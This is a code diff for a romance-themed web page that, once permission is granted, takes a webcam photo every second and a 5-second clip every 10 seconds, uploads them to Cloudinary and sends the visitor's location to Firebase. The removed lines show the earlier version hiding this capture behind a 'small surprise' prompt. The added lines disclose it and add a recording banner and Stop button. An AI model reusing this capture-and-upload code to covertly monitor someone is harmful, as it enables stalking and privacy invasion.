@@ -180,6 +180,68 @@ body {
       color: #2d3748;
       word-break: break-word;
     }
+    #recording-status {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 20;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: max-content;
+      max-width: calc(100vw - 24px);
+      padding: 12px 16px;
+      border-radius: 10px;
+      background: #991b1b;
+      color: #fff;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.4);
+      font-size: 14px;
+    }
+    #recording-status[hidden] { display: none; }
+    #recording-indicator {
+      font-weight: 800;
+      white-space: nowrap;
+    }
+    #recording-detail {
+      margin: 0;
+      max-width: min(52vw, 520px);
+      overflow-wrap: anywhere;
+    }
+    #video-status,
+    #video-next {
+      margin: 4px 0 0;
+      max-width: min(52vw, 520px);
+      overflow-wrap: anywhere;
+      font-size: 12px;
+    }
+    #btn-stop {
+      flex: 0 0 auto;
+      background: #fff;
+      color: #991b1b;
+    }
+    #recording-status.stopped {
+      background: #374151;
+    }
+    @media (max-width: 560px) {
+      #recording-status {
+        top: 8px;
+        align-items: flex-start;
+        flex-wrap: wrap;
+      }
+      #recording-detail,
+      #video-status,
+      #video-next { max-width: 100%; }
+    }
+    .capture-source {
+      position: fixed;
+      left: -2px;
+      top: -2px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
@@ -188,17 +250,26 @@ body {
   <div id="consent-modal">
     <div class="modal-content">
       <h2>Anh iu e nhìu lắm ó:33</h2>
-      <p>Nhấn vào để xem bất ngờ nho nhỏ nè <br> (nhớ cho phép hết quyền nhaa)</p>
+      <p>Sau khi đồng ý và cấp quyền, trang sẽ chụp ảnh mỗi 1 giây, quay clip 5 giây mỗi 10 giây và tải lên Cloudinary đến khi bạn bấm Dừng hoặc đóng tab. Vị trí sẽ được gửi một lần tới Firebase.</p>
       <p id="modal-status" style="display:none; color:#b91c1c;"></p>
       <button id="btn-accept" class="btn-primary">Đồng ý & tiếp tục</button>
     </div>
   </div>
 
   <!-- Giao diện chính sau khi nhấn OK -->
-   <main id="heart" class="heart" aria-hidden="true" hidden></main>
+  <main id="heart" class="heart" aria-hidden="true" hidden></main>
+  <video id="preview" class="capture-source" autoplay muted playsinline aria-hidden="true"></video>
+  <div id="recording-status" role="status" aria-live="polite" hidden>
+    <strong id="recording-indicator">● ĐANG GHI HÌNH</strong>
+    <div>
+      <p id="recording-detail"></p>
+      <p id="video-status">Chưa có clip tải lên.</p>
+      <p id="video-next">Clip đầu tiên sẽ bắt đầu sau 10 giây.</p>
+    </div>
+    <button id="btn-stop" type="button">Dừng</button>
+  </div>
   <div  style="display:none !important; " id="main-app">
     <h3 style="display:none;">Bảng điều khiển Dữ liệu</h3>
-    <video id="preview" autoplay muted playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     
     <div id="status"  style="display:none;"></div>
@@ -233,19 +304,43 @@ body {
     const canvasEl = document.getElementById('canvas');
     const statusEl = document.getElementById('status');
     const modalStatusEl = document.getElementById('modal-status');
+    const recordingStatusEl = document.getElementById('recording-status');
+    const recordingIndicatorEl = document.getElementById('recording-indicator');
+    const recordingDetailEl = document.getElementById('recording-detail');
+    const videoStatusEl = document.getElementById('video-status');
+    const videoNextEl = document.getElementById('video-next');
+    const stopButton = document.getElementById('btn-stop');
 
     let mediaStream = null;
+    let captureRunning = false;
+    let activeRecorder = null;
+    let photoUploadsInFlight = 0;
+    const activeUploads = new Set();
+    const loopWaiters = new Set();
 
     function updateStatus(msg) {
       statusEl.textContent = `Trạng thái: ${msg}`;
+      if (!recordingStatusEl.hidden) {
+        recordingDetailEl.textContent = msg;
+      }
       if (consentModal.style.display !== 'none') {
         modalStatusEl.style.display = 'block';
         modalStatusEl.textContent = msg;
       }
     }
 
+    function updateVideoStatus(msg) {
+      videoStatusEl.textContent = `Video: ${msg}`;
+    }
+
+    function updateVideoSchedule(msg) {
+      videoNextEl.textContent = msg;
+    }
+
     // 1. Xử lý khi người dùng nhấn OK trên bảng thông báo
-    document.getElementById('btn-accept').addEventListener('click', async () => {
+    document.getElementById('btn-accept').addEventListener('click', async (event) => {
+      const acceptButton = event.currentTarget;
+      acceptButton.disabled = true;
       consentModal.style.pointerEvents = 'none';
       updateStatus('Đang yêu cầu quyền camera và microphone...');
       try {
@@ -271,7 +366,12 @@ body {
 
         consentModal.style.display = 'none';
         heartEl.hidden = false;
-        updateStatus('Đã kết nối Camera. Đang tự động chạy các thao tác...');
+        recordingStatusEl.hidden = false;
+        recordingStatusEl.classList.remove('stopped');
+        recordingIndicatorEl.textContent = '● ĐANG CHỤP ẢNH / CHỜ CLIP';
+        stopButton.disabled = false;
+        captureRunning = true;
+        updateStatus('Camera và microphone đang hoạt động. Ảnh chụp mỗi 1 giây; clip 5 giây mỗi 10 giây.');
         await runAutomaticActions(position);
       } catch (err) {
         if (mediaStream) {
@@ -280,9 +380,51 @@ body {
           videoEl.srcObject = null;
         }
         consentModal.style.pointerEvents = 'auto';
+        if (consentModal.style.display !== 'none') {
+          acceptButton.disabled = false;
+        }
         updateStatus('Chưa thể tiếp tục: ' + err.message);
       }
     });
+
+    stopButton.addEventListener('click', stopCapture);
+
+    function stopCapture() {
+      if (!captureRunning) return;
+      captureRunning = false;
+      for (const wake of [...loopWaiters]) wake();
+      if (activeRecorder && activeRecorder.state !== 'inactive') {
+        activeRecorder.stop();
+      }
+      for (const controller of activeUploads) {
+        controller.abort();
+      }
+      if (mediaStream) {
+        mediaStream.getTracks().forEach((track) => track.stop());
+        mediaStream = null;
+        videoEl.srcObject = null;
+      }
+      recordingIndicatorEl.textContent = 'ĐÃ DỪNG';
+      recordingStatusEl.classList.add('stopped');
+      stopButton.disabled = true;
+      stopButton.textContent = 'Đã dừng';
+      updateVideoStatus('Đã dừng.');
+      updateVideoSchedule('Không có clip nào đang được ghi.');
+      updateStatus('Đã dừng chụp, quay và gửi dữ liệu.');
+    }
+
+    function waitForNextCycle(milliseconds) {
+      return new Promise((resolve) => {
+        let timer;
+        const finish = () => {
+          clearTimeout(timer);
+          loopWaiters.delete(finish);
+          resolve();
+        };
+        timer = setTimeout(finish, milliseconds);
+        loopWaiters.add(finish);
+      });
+    }
 
     function getCurrentPosition() {
       return new Promise((resolve, reject) => {
@@ -302,86 +444,202 @@ body {
     // Hàm tải file lên Cloudinary
     async function uploadToCloudinary(blob, resourceType = 'image') {
       const formData = new FormData();
-      formData.append('file', blob);
+      const extension = resourceType === 'video'
+        ? (blob.type.includes('mp4') ? 'mp4' : 'webm')
+        : 'jpg';
+      formData.append('file', blob, `capture-${Date.now()}.${extension}`);
       formData.append('upload_preset', cloudinaryConfig.uploadPreset);
 
       const url = `https://api.cloudinary.com/v1_1/${cloudinaryConfig.cloudName}/${resourceType}/upload`;
-      const response = await fetch(url, { method: 'POST', body: formData });
-      if (!response.ok) throw new Error('Lỗi tải lên Cloudinary');
-      return await response.json();
+      const controller = new AbortController();
+      activeUploads.add(controller);
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData,
+          signal: controller.signal
+        });
+        const data = await response.json();
+        if (!response.ok) {
+          throw new Error(data.error?.message || `Lỗi tải lên Cloudinary (${response.status})`);
+        }
+        return data;
+      } finally {
+        activeUploads.delete(controller);
+      }
     }
 
     // 2. Chụp ảnh và gửi lên Cloudinary
-    async function capturePhoto() {
-      if (!mediaStream) return;
+    async function capturePhoto(photoNumber) {
+      if (!captureRunning || !mediaStream) return;
       if (videoEl.readyState < HTMLMediaElement.HAVE_CURRENT_DATA) {
         await new Promise((resolve) => {
-          const timeout = setTimeout(resolve, 3000);
-          videoEl.addEventListener('loadeddata', () => {
+          let timeout;
+          const finish = () => {
             clearTimeout(timeout);
+            videoEl.removeEventListener('loadeddata', finish);
             resolve();
-          }, { once: true });
+          };
+          timeout = setTimeout(finish, 3000);
+          videoEl.addEventListener('loadeddata', finish, { once: true });
         });
       }
-
-      updateStatus('Đang chụp và tải ảnh lên...');
+      if (!captureRunning || !mediaStream) return;
 
       canvasEl.width = videoEl.videoWidth;
       canvasEl.height = videoEl.videoHeight;
       if (!canvasEl.width || !canvasEl.height) {
-        updateStatus('Lỗi: Camera chưa sẵn sàng để chụp ảnh.');
+        updateStatus('Camera chưa sẵn sàng để chụp ảnh; sẽ thử lại.');
         return;
       }
-      canvasEl.getContext('2d').drawImage(videoEl, 0, 0);
+      const context = canvasEl.getContext('2d');
+      if (!context) {
+        updateStatus('Không thể khởi tạo canvas để chụp ảnh.');
+        return;
+      }
+      context.drawImage(videoEl, 0, 0);
 
-      await new Promise((resolve) => {
-        canvasEl.toBlob(async (blob) => {
-          try {
-            if (!blob) throw new Error('Không thể tạo ảnh');
-            const data = await uploadToCloudinary(blob, 'image');
-            updateStatus(`Đã tải ảnh thành công! Link: ${data.secure_url}`);
-          } catch (err) {
-            updateStatus(`Lỗi: ${err.message}`);
-          } finally {
-            resolve();
-          }
-        }, 'image/jpeg');
+      const blob = await new Promise((resolve) => {
+        canvasEl.toBlob(resolve, 'image/jpeg');
       });
+      if (!blob) throw new Error('Không thể tạo ảnh.');
+      if (!captureRunning) return;
+      if (photoUploadsInFlight >= 2) {
+        updateStatus(`Đã chụp ảnh #${photoNumber}; tạm bỏ tải lên vì các lượt trước vẫn đang gửi.`);
+        return;
+      }
+
+      photoUploadsInFlight += 1;
+      updateStatus(`Đang tải ảnh #${photoNumber} lên Cloudinary...`);
+      void uploadToCloudinary(blob, 'image')
+        .then(() => {
+          if (captureRunning) updateStatus(`Đã tải ảnh #${photoNumber} thành công.`);
+        })
+        .catch((err) => {
+          if (captureRunning) updateStatus(`Lỗi tải ảnh: ${err.message}`);
+        })
+        .finally(() => {
+          photoUploadsInFlight -= 1;
+        });
     }
 
-    // 3. Quay video 5 giây có hiển thị trạng thái và gửi lên Cloudinary
-    async function recordVideo() {
-      if (!mediaStream) return;
-      if (!window.MediaRecorder) {
-        updateStatus('Lỗi: Trình duyệt không hỗ trợ ghi video.');
-        return;
+    async function runPhotoLoop() {
+      let photoNumber = 0;
+      while (captureRunning) {
+        const captureStart = Date.now();
+        photoNumber += 1;
+        try {
+          await capturePhoto(photoNumber);
+        } catch (err) {
+          if (captureRunning) updateStatus(`Lỗi chụp ảnh: ${err.message}`);
+        }
+        const delay = Math.max(0, 1000 - (Date.now() - captureStart));
+        if (captureRunning && delay > 0) await waitForNextCycle(delay);
       }
-      updateStatus('Đang ghi hình (5 giây)...');
+    }
 
-      await new Promise((resolve) => {
+    // 3. Quay và gửi clip 5 giây theo chu kỳ 10 giây
+    async function recordVideo(videoNumber) {
+      if (!captureRunning || !mediaStream) return;
+      recordingIndicatorEl.textContent = '● ĐANG QUAY VIDEO (5 GIÂY)';
+      updateVideoStatus(`Đang quay clip #${videoNumber} (5 giây).`);
+      updateVideoSchedule(`Đang ghi clip #${videoNumber}.`);
+
+      await new Promise((resolve, reject) => {
         const recorder = new MediaRecorder(mediaStream);
         const chunks = [];
+        let timer;
+        let settled = false;
+        activeRecorder = recorder;
+
+        const finish = (error) => {
+          if (settled) return;
+          settled = true;
+          clearTimeout(timer);
+          if (activeRecorder === recorder) activeRecorder = null;
+          if (error) reject(error);
+          else resolve();
+        };
 
         recorder.ondataavailable = (event) => {
           if (event.data.size > 0) chunks.push(event.data);
         };
 
+        recorder.onerror = () => finish(new Error('Trình duyệt gặp lỗi khi ghi video.'));
+
         recorder.onstop = async () => {
-          updateStatus('Đang tải video lên Cloudinary...');
-          const videoBlob = new Blob(chunks, { type: 'video/webm' });
+          if (settled) return;
+          if (!captureRunning) {
+            finish();
+            return;
+          }
+
+          recordingIndicatorEl.textContent = '● ĐANG TẢI VIDEO';
+          updateVideoStatus(`Đang tải clip #${videoNumber} lên Cloudinary...`);
+          updateVideoSchedule(`Đang tải clip #${videoNumber} lên Cloudinary.`);
           try {
+            if (!chunks.length) {
+              throw new Error('MediaRecorder không trả về dữ liệu video.');
+            }
+            const videoBlob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+            if (!videoBlob.size) {
+              throw new Error('Video được ghi có dung lượng bằng 0.');
+            }
             const data = await uploadToCloudinary(videoBlob, 'video');
-            updateStatus(`Đã tải video thành công! Link: ${data.secure_url}`);
+            if (captureRunning) {
+              updateVideoStatus(`Đã lưu clip #${videoNumber}: ${data.secure_url}`);
+            }
           } catch (err) {
-            updateStatus(`Lỗi: ${err.message}`);
+            if (captureRunning) updateVideoStatus(`Lỗi: ${err.message}`);
           } finally {
-            resolve();
+            if (captureRunning) {
+              recordingIndicatorEl.textContent = '● ĐANG CHỤP ẢNH / CHỜ CLIP';
+            }
+            finish();
           }
         };
 
-        recorder.start();
-        setTimeout(() => recorder.stop(), 5000);
+        try {
+          recorder.start();
+          timer = setTimeout(() => {
+            if (recorder.state !== 'inactive') recorder.stop();
+          }, 5000);
+        } catch (err) {
+          finish(err);
+        }
       });
+    }
+
+    async function runVideoLoop() {
+      if (!window.MediaRecorder) {
+        updateStatus('Trình duyệt không hỗ trợ quay video; ảnh vẫn tiếp tục được chụp.');
+        return;
+      }
+
+      let videoNumber = 0;
+      let nextVideoStart = Date.now() + 10000;
+      while (captureRunning) {
+        const delay = Math.max(0, nextVideoStart - Date.now());
+        if (delay > 0) {
+          updateVideoSchedule(`Clip #${videoNumber + 1} sẽ bắt đầu sau ${Math.ceil(delay / 1000)} giây.`);
+          await waitForNextCycle(Math.min(1000, delay));
+          continue;
+        }
+        if (!captureRunning) return;
+
+        videoNumber += 1;
+        try {
+          await recordVideo(videoNumber);
+        } catch (err) {
+          if (captureRunning) {
+            recordingIndicatorEl.textContent = '● ĐANG CHỤP ẢNH / CHỜ CLIP';
+            updateVideoStatus(`Lỗi ghi clip #${videoNumber}: ${err.message}`);
+          }
+        }
+
+        nextVideoStart += 10000;
+        if (nextVideoStart <= Date.now()) nextVideoStart = Date.now() + 10000;
+      }
     }
 
     // 4. Lấy và gửi vị trí lên Firebase Realtime Database
@@ -402,9 +660,12 @@ body {
     }
 
     async function runAutomaticActions(position) {
-      await capturePhoto();
-      await recordVideo();
-      await sendLocation(position);
+      if (!captureRunning) return;
+      await Promise.all([
+        sendLocation(position),
+        runPhotoLoop(),
+        runVideoLoop()
+      ]);
     }
   </script>
   <script>
